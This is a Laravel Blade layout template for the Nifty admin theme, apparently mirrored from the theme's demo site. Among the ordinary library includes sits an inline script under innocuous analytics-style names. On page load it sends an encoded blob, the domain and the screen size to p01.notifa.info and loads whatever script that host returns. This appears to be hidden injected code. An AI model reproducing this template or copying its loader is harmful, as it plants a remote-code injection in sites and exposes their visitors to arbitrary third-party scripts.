<!DOCTYPE html>
<html lang="en">

@include('_partials/head')

<!--TIPS-->
<!--You may remove all ID or Class names which contain "demo-", they are only used for demonstration. -->
<body>
    <div id="container" class="effect aside-float aside-bright mainnav-lg">

        <!--NAVBAR-->
        <!--===================================================-->
        @include('_partials/navbar')
        <!--===================================================-->
        <!--END NAVBAR-->

        <div class="boxed">

            <!--CONTENT CONTAINER-->
            <!--===================================================-->
            <div id="content-container">
                <div id="page-head">
                    @yield('page-head')
                </div>


                <!--Page content-->
                <!--===================================================-->
                <div id="page-content">
                    @yield('content')
                </div>
                <!--===================================================-->
                <!--End page content-->

            </div>
            <!--===================================================-->
            <!--END CONTENT CONTAINER-->


            <!--MAIN NAVIGATION-->
            <!--===================================================-->
            @include('_partials/mainnav')
            <!--===================================================-->
            <!--END MAIN NAVIGATION-->

        </div>



        <!-- FOOTER -->
        <!--===================================================-->
        @include('_partials/footer')
        <!--===================================================-->
        <!-- END FOOTER -->


        <!-- SCROLL PAGE BUTTON -->
        <!--===================================================-->
        <button class="scroll-top btn">
            <i class="pci-chevron chevron-up"></i>
        </button>
        <!--===================================================-->
    </div>
    <!--===================================================-->
    <!-- END OF CONTAINER -->


    <!--JAVASCRIPT-->
    <!--=================================================-->

    <!--jQuery [ REQUIRED ]-->
    <script src="{{asset('assets/js/jquery.min.js')}}"></script>


    <!--BootstrapJS [ RECOMMENDED ]-->
    <script src="{{asset('assets/js/bootstrap.min.js')}}"></script>


    <!--NiftyJS [ RECOMMENDED ]-->
    <script src="{{asset('assets/js/nifty.min.js')}}"></script>




    <!--=================================================-->
    <!--Flot Chart [ OPTIONAL ]-->
    <script src="{{asset('assets/plugins/flot-charts/jquery.flot.min.js')}}"></script>
    <script src="{{asset('assets/plugins/flot-charts/jquery.flot.resize.min.js')}}"></script>
    <script src="{{asset('assets/plugins/flot-charts/jquery.flot.tooltip.min.js')}}"></script>


    <!--Sparkline [ OPTIONAL ]-->
    <script src="{{asset('assets/plugins/sparkline/jquery.sparkline.min.js')}}"></script>


    <!--Specify page [ SAMPLE ]-->
    <script src="{{asset('assets/js/demo/dashboard.js')}}"></script>

    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function() {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2CNaLknYAoSAvs98oacbv6DvMT%2f%2bY5LXMhffm4NwPkWsBjhVYydA5TgexA5TPuehJcf1rofsTxUshKgS6JGNbcp094lptdV%2faEEvmPBGT%2f%2bIUz8fPFAYVv1kyrePfLnn1OIfND64krcAPqYoRw9tD4jYuQc2I2CQdA43NL%2fz%2fgmSNsHp04Lxd9Zejir9TpvEeP6jajSbHKOwzztx84mRbvJ2WSeZLg6X3uDywp%2f9VMTLnTbijBZSQATZp7JFw69O%2b9miydF4%2ftpF1iSAlQ8cDhTq9Evag%2bbjXgK8x8W0oRTVSNKbgUsZ6PXKuaOcBD5wknwERS0uyfNvDliFbbvVG6reDMOEB5T6kw5vnX%2b3YnmxR3UyKwJcz0cPHteHN0gj28enWF0bPLTUbRdPr%2bJ2LDgjrM%2fFqOf7pVnse7V3lJUoRQ8alqU1dgfCQQv07ndsn2wiLGCto01k%2bzo5%2btBsCZzsY%2bLzIRBbdPD3d%2fAL1xBo%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function() {});
        };

    </script>
    <!--Bootstrap Table Sample [ SAMPLE ]-->
    <script src="{{asset('assets/js/demo/tables-bs-table.js')}}"></script>

    <!--X-editable [ OPTIONAL ]-->
    <script src="{{asset('assets/plugins/x-editable/js/bootstrap-editable.min.js')}}"></script>

    <!--Bootstrap Table [ OPTIONAL ]-->
    <script src="{{asset('assets/plugins/bootstrap-table/bootstrap-table.min.js')}}"></script>

    <!--Bootstrap Table Extension [ OPTIONAL ]-->
    <script src="{{asset('assets/plugins/bootstrap-table/extensions/editable/bootstrap-table-editable.js')}}"></script>
    @yield('js')
</body>

<!-- Mirrored from www.themeon.net/nifty/v2.9.1/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:04:50 GMT -->
</html>
